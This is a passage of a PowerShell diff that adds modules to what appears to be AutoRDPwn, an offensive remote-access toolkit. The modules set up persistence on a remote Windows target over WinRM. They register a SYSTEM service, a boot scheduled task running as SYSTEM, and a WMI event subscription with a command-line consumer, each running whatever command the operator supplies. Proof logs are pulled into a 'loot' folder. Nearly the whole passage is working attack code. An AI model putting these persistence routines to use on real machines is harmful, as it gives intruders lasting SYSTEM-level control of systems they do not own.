+            else {
+                Write-ARSuccess 'The service ran this command as LocalSystem:'
+                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 20) -join "`n")
+                $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+                $localProof = Join-Path (Get-ARLootDirectory 'persistence') ($safeTarget + '-service-proof-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.log')
+                try { Receive-ARFileFromTarget -RemotePath $proofLog -LocalPath $localProof -Session $session | Out-Null }
+                catch { Write-ARWarn ('Proof copy could not be pulled: ' + $_.Exception.Message) }
+            }
+        }
+    }
+    finally {
+        # The target has no service sweep at session end: this handler deletes the
+        # service it created, both when the body throws and when it completes.
+        try {
+            $left = Invoke-ARRemote -Session $session -ArgumentList $serviceName -ScriptBlock {
+                param($name)
+                & sc.exe stop $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    $current = Get-Service -Name $name -ErrorAction SilentlyContinue
+                    if ($null -eq $current) { break }
+                    if ([string]$current.Status -eq 'Stopped') { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                return @(Get-Service -Name $name -ErrorAction SilentlyContinue).Count
+            }
+            if ([int]$left -eq 0) { Write-ARInfo ('Service removed: ' + $serviceName + ' (nothing is left registered)') }
+            else { Write-ARWarn ('Service still registered after the delete: ' + $serviceName + ' â€” remove it with sc.exe delete.') }
+        }
+        catch { Write-ARWarn ('Service removal incomplete: ' + $_.Exception.Message + ' â€” remove ' + $serviceName + ' with sc.exe delete.') }
+        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedServices.Remove($serviceName) }
+        if ($command.Contains($proofLog)) {
+            try {
+                Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
+                    param($path)
+                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
+                } | Out-Null
+            }
+            catch { }
+            [void]$script:ARModuleFiles.Remove($proofLog)
+        }
+    }
+    Set-ARStatus 'Auto-start service persistence finished' 'Ok'
+    return [pscustomobject]@{
+        Id       = '522'
+        Action   = 'ServicePersistence'
+        Mode     = 'install'
+        Target   = $target
+        Service  = $serviceName
+        BinPath  = $binPath
+        Command  = [string]$command
+        Proof    = ([string]$proof).Trim()
+        Removed  = $true
+    }
+}
+
+function Invoke-ARModuleBootTask {
+    param([switch]$Remove)
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Boot scheduled task'
+    $session = Get-ARTargetSession
+    if ($Remove) {
+        $ledger = New-Object System.Collections.Generic.List[string]
+        if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
+            foreach ($name in @($script:ARRemoteTasks.ToArray())) {
+                if (([string]$name).StartsWith('AutoRDPwnBoot')) { $ledger.Add([string]$name) }
+            }
+        }
+        $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
+            param($names)
+            $deleted = New-Object System.Collections.Generic.List[string]
+            $failed = New-Object System.Collections.Generic.List[string]
+            $all = New-Object System.Collections.Generic.List[string]
+            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
+            # Interrupted runs leave the prefix behind; the sweep uses the same one.
+            foreach ($task in @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { [string]$_.TaskName -like 'AutoRDPwnBoot*' } | Select-Object -First 100)) {
+                if (-not $all.Contains([string]$task.TaskName)) { $all.Add([string]$task.TaskName) }
+            }
+            foreach ($name in @($all.ToArray())) {
+                $existed = ($null -ne (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue))
+                & schtasks.exe /end /tn $name 2>&1 | Out-Null
+                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
+                if ($null -eq (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue)) {
+                    if ($existed) { $deleted.Add($name) }
+                }
+                else { $failed.Add($name + ': still registered after Unregister-ScheduledTask') }
+            }
+            return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($failed.ToArray()) }
+        }
+        $removedNames = @($removal.Deleted)
+        foreach ($name in $removedNames) {
+            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove([string]$name) }
+            Write-ARSuccess ('Removed boot task: ' + [string]$name)
+        }
+        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Boot task removal failed: ' + [string]$item) }
+        if ($removedNames.Count -eq 0) { Write-ARInfo 'No AutoRDPwn boot task is registered on the target.' }
+        Set-ARStatus 'Boot task removal finished' 'Ok'
+        return [pscustomobject]@{
+            Id      = '523'
+            Action  = 'BootTask'
+            Mode    = 'remove'
+            Target  = $target
+            Removed = $removedNames
+            Failed  = @($removal.Failed)
+        }
+    }
+    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn boot task ran at %DATE% %TIME% >> "' + $proofLog + '"'
+    $command = $defaultCommand
+    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the boot task must run as SYSTEM' $defaultCommand }
+    $split = Split-ARModuleExecutable -Command ([string]$command)
+    $taskName = 'AutoRDPwnBoot' + (New-ARModuleToken -Length 6)
+    $result = Invoke-ARRemote -Session $session -ArgumentList $taskName, $split.Executable, $split.Arguments -ScriptBlock {
+        param($name, $execute, $argumentText)
+        $action = New-ScheduledTaskAction -Execute $execute -Argument $argumentText
+        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force -ErrorAction Stop | Out-Null
+        $registered = Get-ScheduledTask -TaskName $name -ErrorAction Stop
+        $triggerNames = New-Object System.Collections.Generic.List[string]
+        foreach ($item in @($registered.Triggers)) { $triggerNames.Add([string]$item.CimClass.CimClassName) }
+        $executePath = ''
+        $argumentsText = ''
+        foreach ($item in @($registered.Actions)) { $executePath = [string]$item.Execute; $argumentsText = [string]$item.Arguments }
+        return [pscustomobject]@{
+            Name      = [string]$registered.TaskName
+            State     = [string]$registered.State
+            User      = [string]$registered.Principal.UserId
+            Run       = [string]$registered.Principal.RunLevel
+            Triggers  = @($triggerNames.ToArray())
+            Execute   = $executePath
+            Arguments = $argumentsText
+        }
+    }
+    $triggerText = (@($result.Triggers) -join ' ')
+    if ([string]$result.User -notmatch '(?i)^(SYSTEM|S-1-5-18)$' -or $triggerText -notmatch 'Boot') {
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $taskName -ScriptBlock {
+                param($name)
+                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+        throw ('The task was registered but does not report a boot trigger running as SYSTEM (principal ' + [string]$result.User + ', triggers ' + $triggerText + ').')
+    }
+    if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
+        if (-not $script:ARRemoteTasks.Contains($taskName)) { $script:ARRemoteTasks.Add($taskName) }
+    }
+    if ($command.Contains($proofLog) -and -not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
+    Write-ARSuccess ('Boot task registered: ' + $taskName + ' (SYSTEM, trigger ' + $triggerText + ', state ' + [string]$result.State + ')')
+    Write-ARInfo ('  runs: ' + [string]$result.Execute + ' ' + [string]$result.Arguments)
+    if ($command.Contains($proofLog)) { Write-ARInfo ('  the payload appends its proof to ' + $proofLog + ' at the next boot.') }
+    Write-ARInfo 'The task stays registered until session cleanup or a removal run.'
+    Set-ARStatus 'Boot task registered' 'Ok'
+    return [pscustomobject]@{
+        Id       = '523'
+        Action   = 'BootTask'
+        Mode     = 'install'
+        Target   = $target
+        Task     = $taskName
+        Command  = [string]$command
+        User     = [string]$result.User
+        Triggers = @($result.Triggers)
+        Removed  = $false
+    }
+}
+
+function Invoke-ARModuleWmiSubscription {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WMI event subscription'
+    $session = Get-ARTargetSession
+    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn wmi payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
+    $command = $defaultCommand
+    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the WMI consumer must run' $defaultCommand }
+    $command = ([string]$command).Trim()
+    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The WMI consumer command is empty.' }
+    if ($command -match "[\r\n]") { throw 'The WMI consumer command must be a single line.' }
+    $filterName = 'AutoRDPwnF' + (New-ARModuleToken -Length 6)
+    $consumerName = 'AutoRDPwnC' + (New-ARModuleToken -Length 6)
+    $proof = ''
+    $removedParts = @()
+    $left = -1
+    try {
+        $created = Invoke-ARRemote -Session $session -ArgumentList $filterName, $consumerName, $command -ScriptBlock {
+            param($filter, $consumer, $commandLine)
+            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpDownStatus = 1"
+            $filterObject = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $query } -ErrorAction Stop
+            $consumerObject = $null
+            try {
+                $consumerObject = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumer; CommandLineTemplate = $commandLine } -ErrorAction Stop
+                $null = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filterObject; Consumer = $consumerObject } -ErrorAction Stop
+            }
+            catch {
+                # A partial trio outlives its own run, so the half this call created goes now.
+                if ($null -ne $consumerObject) { Remove-WmiObject -InputObject $consumerObject -ErrorAction SilentlyContinue }
+                if ($null -ne $filterObject) { Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
+                throw
+            }
+            $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue | Where-Object { ([string]$_.Filter + ' ' + [string]$_.Consumer).Contains(('Name="' + $filter + '"')) })
+            return [pscustomobject]@{
+                Filter   = $filter
+                Consumer = $consumer
+                Bindings = [int]$bindings.Count
+            }
+        }
+        if ([int]$created.Bindings -lt 1) { throw 'The filter and the consumer exist but no binding was created.' }
+        Write-ARSuccess ('WMI subscription created: ' + $filterName + ' / ' + $consumerName)
+        if ($command.Contains($proofLog)) {
+            if (-not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
+            for ($attempt = 0; $attempt -lt 15; $attempt++) {
+                Start-Sleep -Seconds 3
+                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
+                    param($path)
+                    if (-not (Test-Path -LiteralPath $path)) { return '' }
+                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
+                })
+                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+            }
+            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof line appeared in 45 s: the consumer fires on the next system uptime poll, so a slow target may need a second run.' }
+            else {
+                Write-ARSuccess 'The consumer ran this command:'
+                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 20) -join "`n")
+                $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+                $localProof = Join-Path (Get-ARLootDirectory 'persistence') ($safeTarget + '-wmi-proof-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.log')
+                try { Receive-ARFileFromTarget -RemotePath $proofLog -LocalPath $localProof -Session $session | Out-Null }
+                catch { Write-ARWarn ('Proof copy could not be pulled: ' + $_.Exception.Message) }
+            }
+        }
+    }
+    finally {
+        try {
+            $removal = Invoke-ARRemote -Session $session -ArgumentList $filterName, $consumerName -ScriptBlock {
+                param($filter, $consumer)
+                $removed = New-Object System.Collections.Generic.List[string]
+                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
+                foreach ($binding in $bindings) {
+                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
+                    if ($references.Contains(('Name="' + $filter + '"')) -or $references.Contains(('Name="' + $consumer + '"'))) {
+                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
+                        $removed.Add('binding')
+                    }
+                }
+                foreach ($instance in @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumer })) {
+                    Remove-WmiObject -InputObject $instance -ErrorAction SilentlyContinue
+                    $removed.Add('consumer')
+                }
+                foreach ($instance in @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filter })) {
+                    Remove-WmiObject -InputObject $instance -ErrorAction SilentlyContinue
+                    $removed.Add('filter')
+                }
+                $remaining = 0
+                $remaining = $remaining + @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumer }).Count
+                $remaining = $remaining + @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filter }).Count
+                return [pscustomobject]@{ Removed = @($removed.ToArray()); Left = [int]$remaining }
+            }
+            $removedParts = @($removal.Removed)
+            $left = [int]$removal.Left
+            if ($left -eq 0) { Write-ARInfo ('WMI subscription removed: ' + $filterName + ' / ' + $consumerName + ' (nothing is left registered)') }
+            else { Write-ARWarn ('WMI objects still present after the delete: ' + [string]$left + ' under ' + $filterName + ' / ' + $consumerName + '.') }
+        }
+        catch { Write-ARWarn ('WMI subscription removal incomplete: ' + $_.Exception.Message) }
+        if ($command.Contains($proofLog)) {
+            try {
+                Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
+                    param($path)
+                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
+                } | Out-Null
+            }
+            catch { }
+            [void]$script:ARModuleFiles.Remove($proofLog)
+        }
+    }
+    Set-ARStatus 'WMI subscription proof finished' 'Ok'
+    return [pscustomobject]@{
+        Id       = '524'
+        Action   = 'WmiSubscription'
+        Target   = $target
+        Filter   = $filterName
+        Consumer = $consumerName
+        Command  = $command
+        Proof    = ([string]$proof).Trim()
+        Removed  = $removedParts
+        Left     = [int]$left
+    }
 }
 
 function Show-ARLineLanguagePicker {
